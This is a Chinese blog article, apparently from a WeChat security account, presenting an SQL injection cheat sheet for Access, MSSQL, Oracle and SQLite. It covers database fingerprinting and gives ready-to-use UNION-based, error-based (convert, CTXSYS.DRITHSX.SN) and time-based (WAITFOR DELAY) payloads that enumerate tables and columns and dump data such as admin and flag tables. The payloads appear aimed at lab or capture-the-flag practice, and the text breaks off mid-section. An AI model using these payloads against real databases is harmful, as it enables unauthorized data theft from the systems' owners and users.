---
title: 各个数据库sql注入及waf绕过
url: https://mp.weixin.qq.com/s/CDVqIqe-pphdlTJjZmv-xA
source: Doonsec's feed
date: 2026-01-14
fetch_date: 2026-01-15T03:28:33.823902
---

# 各个数据库sql注入及waf绕过

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ib1EqZv5G9SNPIxWuHEu96glzwrd2c9aibibqpungcCYmu60OicHwYZ6Uo9hGdeQevvibG0KCYrnExcFUq9m1tZfULg/0?wx_fmt=jpeg)

# 各个数据库sql注入及waf绕过

原创

网安热爱者week

week的杂货铺

![]()

在小说阅读器中沉浸阅读

# 常见的数据库：

acesss数据库：少见 基本淘汰

mssql数据库  也叫sql server

oracle数据库

sqllite数据库

# 一键判断表格：

|  |  |  |  |  |  |  |
| --- | --- | --- | --- | --- | --- | --- |
| 字符串 / 表达式 | MySQL | PostgreSQL | SQL Server | Oracle | SQLite |  |
| 版本信息 |  |  |  |  |  |  |
| `@@version` | ✅ | ❌ | ✅ | ❌ | ❌ |  |
| `version()` | ✅（别名） | ✅ | ❌ | ✅ | ✅（部分） |  |
| `SELECT VERSION();` | ✅ | ✅ | ❌ | ❌ | ✅ |  |
| `SELECT @@VERSION;` | ✅ | ❌ | ✅ | ❌ | ❌ |  |
| 当前用户 |  |  |  |  |  |  |
| `user()` | ✅ | ✅ | ✅ | ✅ | ✅ |  |
| `current_user` | ✅ | ✅（函数） | ✅（函数） | ✅（伪列） | ✅ |  |
| `SYSTEM_USER` | ❌ | ❌ | ✅ | ❌ | ❌ |  |
| `SESSION_USER` | ✅ | ✅ | ✅ | ✅ | ✅ |  |
| 当前数据库名 |  |  |  |  |  |  |
| `database()` | ✅ | ❌ | ❌ | ❌ | ✅（别名） |  |
| `schema()` | ❌ | ✅（等效） | ❌ | ❌ | ❌ |  |
| `current_database()` | ❌ | ✅ | ❌ | ❌ | ❌ |  |
| `DB_NAME()` | ❌ | ❌ | ✅ | ❌ | ❌ |  |
| `SELECT name FROM v$database;` | ❌ | ❌ | ❌ | ✅ | ❌ |  |
| 字符串拼接 |  |  |  |  |  |  |
| `'a' 'b'`  （空格拼接） | ✅ | ❌ | ❌ | ❌ | ✅ |  |
| `CONCAT('a','b')` | ✅ | ✅ | ✅（2012+） | ✅ | ✅ |  |
| `'a' |  | 'b'` | ❌（需设置） | ✅ | ❌（默认关） |  |
| `'a'+'b'` | ❌ | ❌ | ✅ | ❌ | ❌ |  |
| 注释语法 |  |  |  |  |  |  |
| `-- comment` | ✅ | ✅ | ✅ | ✅ | ✅ |  |
| `# comment` | ✅ | ❌ | ❌ | ❌ | ❌ |  |
| `/* comment */` | ✅ | ✅ | ✅ | ✅ | ✅ |  |
| 延时函数（盲注） |  |  |  |  |  |  |
| `SLEEP(5)` | ✅ | ❌ | ❌ | ❌ | ❌ |  |
| `PG_SLEEP(5)` | ❌ | ✅ | ❌ | ❌ | ❌ |  |
| `WAITFOR DELAY '0:0:5'` | ❌ | ❌ | ✅ | ❌ | ❌ |  |
| `DBMS_LOCK.SLEEP(5)` | ❌ | ❌ | ❌ | ✅ | ❌ |  |
| `RANDOMBLOB(1000000)`  （耗资源） | ❌ | ❌ | ❌ | ❌ | ✅ |  |

ps：微信能不能优化一下你的表格，看着好痛苦......

注释格式判断：

/\* 是mysql中的注释符 （错误说明数据库不是mysql）

- 是oracle 和 mssql的支持注释符

; 是子句查询标识符 oracle不支持多行查询,会返回错误

内置函数，数据库判断：

以下均为返回正常时候，说明是相应数据库：

access数据库：

```
and (select count(*)from MSysAccessObjects) >0
```

mssql数据库： 也叫sql server

```
and (select count(*)from sysobjects) >0
```

mysql:

```
and length(user())>10
```

oracle:

dual虚拟库

postgresql:

```
select extract(dow from now()) select verison() --
```

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNPIxWuHEu96glzwrd2c9aibyPTicHmGGFibHx4lLavWibXq0AvEuDS61OP8gXFcm5rjrUmdJTNVMHQ9A/640?wx_fmt=png&from=appmsg)

access数据库：

更多是文件类型的本地数据库

文件后缀为.mdb 或者 .accdb

navicat无法连接

Access数据库简介

MicrosoftOfficeAccess是由微软发布的关系数据库管理系统。MicrosoftOfficeAccess是微软把数据库引擎的图形用户界面和软件开发工具结合在一起的一个数据库管理系统。它是微软Office家族的一个成员。Access以它自己的格式将数据存储在基于AccessJet的数据库引擎里。Access数据库属于文件型数据库，所以不需要端口号。在Office2007之前的Access数据库文件的后缀是.mdb，Office2007及其之后的Access数据库文件的后缀是.accdb。

无注释的

隔离系统的

性能差的

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNPIxWuHEu96glzwrd2c9aibJ1t05c8udFR95rsnn2d11l7qRdhfqIZ7cR0m1qNvmGmmJRMuJvay5g/640?wx_fmt=png&from=appmsg)

# 注入姿势：

```
原始语句：select * from news where id= 1 and 1=11 and order by 101 and union select 1,2,3,4 from 表名只能猜测表名 常见：admin sys system user news 【字典爆破】1 and union select 1,列名,3,4 from 表名只能猜测列名 常见：username users user pass passwd password key  【字典爆破】
```

已知表名情况下,这里给一个好方式：

```
1 and union select 1,表名.*,3,4 from 表名
```

表名.\*会占用 1,2,3,4

每有一个列 会占用一个数字 假若数字不够 会报错

【也就是说 如果查询数目比列数多的话 这种可以直接获得返回的列名】

mssql 数据库 (sql server)

# 特点

可用navicat连接

存在系统自带库

information\_schema.tables information\_schema.columns

对数据类型敏感

使用null填充 然后进行猜测数据类型

常见报错 ：must be of type string 数据类型不对

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNPIxWuHEu96glzwrd2c9aibVe7UW34DoVhg5iadia4QyRwWRpvFeema8VfykCPdtVj6tz5xBibZricwYw/640?wx_fmt=png&from=appmsg)

内置函数：
db\_name() 数据库名

suser\_name() 用户登入名 (sa为最高权限)

@@version

@@SERVERNAME

不支持limit

# union：

## 注入姿势：

```
原语句select * from news where id = 1 order by 41 and 1=2 union select null,null,null测试数据类型时 使用：回显成功说明数据类型正确1 and 1=2 union select 1,'a',1.1,true,false1 and 1=2 union select 1,table_name,'b' from information_schema.tablesmssql不支持limit,用来替换limit:1 and 1=2 union select 1,table_name,'b' from information_schema.tables where table_name<>'flags' and table_name<>'news'1 and 1=2 union select 1,column_name,'b' from information_schema.columns where table_name='flags'1 and 1=2 union select 1,flag,'c' from flags
```

## 内置特殊表:sysobjects syscolumns

sysobjects重要列 name id xtype
![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNPIxWuHEu96glzwrd2c9aib9Q1cFAD2HFReHZvjibEqUFgBLYtlY9s9WoiaeFtec43we113zUV68vPA/640?wx_fmt=png&from=appmsg)

xtype：

S 系统自带的

U 用户创建可使用

```
select * from sysobjects where xtype='u'
```

id:用来唯一标识所属的表

可以用来查找列名

```
select * from syscolumns where id=114514
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/ib1EqZv5G9SNPIxWuHEu96glzwrd2c9aiblO8vSmC56G5s05SBoLhnGRmdPic50RCOjlibF7dcsy4VlnofDmiaADYkQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNPIxWuHEu96glzwrd2c9aibrdDLWicficHzicJgzZo40D4600RCN3OX90rN4WxacBDBK67iaOWLwia1bCQ/640?wx_fmt=png&from=appmsg)

### 使用方式

```
先用：select * from sysobjects where xtype='u'查看所有创建的表 并记录 name id然后select * from syscolumns where id=114514得到指定表的列
```

# 报错

convert(int,@@version)

对于convert（int,@@version），convert函数首先会执行第二个参数指定的sql查询，然后尝试将查询结果转换为int类型。但是，由于这个sQL查询的结果是varchar类型，无法进行指定的转换，所以，convert函数会抛出一个sQLserver错误消息，指出“SQL查询结果”无法转换为“int”类型，这样的话，攻击者就能得到的这个SQL查询的结果了。

```
select * from news where id=使用top 1 限制输出仅一个 convert仅能转义唯一的输出convert(int,(select top 1 name from sysobjects where xtype='u')) convert(int,(select top 1 name from sysobjects where xtype='u' and name<>'news'))
```

# 时间：

# 这里放一个大佬的文章

https://cloud.tencent.com/developer/article/1631808

```
select * from usernames where id=1 WAITFOR DELAY '0:0:4' #延时说明前面的条件为true(存在)if (select ......) WAITFOR DELAY '0:0:4'
```

oracle数据库

数据类型敏感

内置表：

all\_tables

user\_all\_tables

all\_tab\_columns

user\_tab\_columns

v$version

报错格式

![](https://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNPIxWuHEu96glzwrd2c9aibAbs1ZbcLxddJUib5Yct97jx51icGhLDiaIpJABjktTg2tgiclzQcpHm84Q/640?wx_fmt=png&from=appmsg)

limit 替代：
rownum=1

```
select id,username from news where rownum=1select id,username from news where rownum=1 and id<>1select id,username from news where rownum=1 and id<>1 and id<>2或者：select id,username from (select rownum ys,id,username from news) where ys =2也就是select 查询内容 from (select rownum ys,查询内容 from news) where ys =2
```

注入姿势：

```
select * from news where id =1 order by 4#数据类型判断1 and 1=2 union select null,null,null from dual1 and 1=2 union select 1,'b','c' from dual1 and 1=2 union select 1,table_name,'c' from user_all_tables where rownum=11 and 1=2 union select 1,table_name,'c' from user_all_tables where rownum=1 and table_name<>'NEWS'1 and 1=2 union select 1,column_name,'c' from user_tab_columns where table_name='ADMINS' and rownum=11 and 1=2 union select 1,flag,'c' from flags
```

报错：

```
1=CTXSYS.DRITHSX.SN(1,(select banner from v$version where rownum=1))1=utl_inaddr.get_host_name(1,(select banner from v$version where rownum=1))
```

```
select * from news where id =1 and 1=CTXSYS.DRITHSX.SN(1,(select banner from v$version where rownum=1))1 and 1=CTXSYS.DRITHSX.SN(1,(select table_name from user_all_tables where rownum=1))1 and 1=CTXSYS.DRITHSX.SN(1,(select table_name from user_all_tables where rownum=1 and table_name<>'NEWS'))或者：1 and 1=CTXSYS.DRITHSX.SN(1,(select table_name from (select rownum ys,table_name from user_all_tables) where ys=2))
```

更多的报错：

https://www.cnblogs.com/-qing-/p/10949562.html

sqllit数据库

# 1. 基础知识:

内置函数：

sqlite\_version()

内置库：

sqlite\_master

# 2. 简单注入：

## 2.1. 查看版本：

```
0' union select 1,2,sqlite_version();
```

## 2.2. 表名列名：

```
0' union select 1,2,sql from sqlite_master;0' union select 1,2,sql from sqlite_master where type='table';0' union select 1,2,sql from sqlite_master where type='table' and name='user_data';
```

## 2.3. limit group\_concat():

```
0' union select 1,2,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --#或者使用limit来输出一行结果0' union select 1,2,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 2 offset 1 --
```

## 2.4. 格式化输出：

`...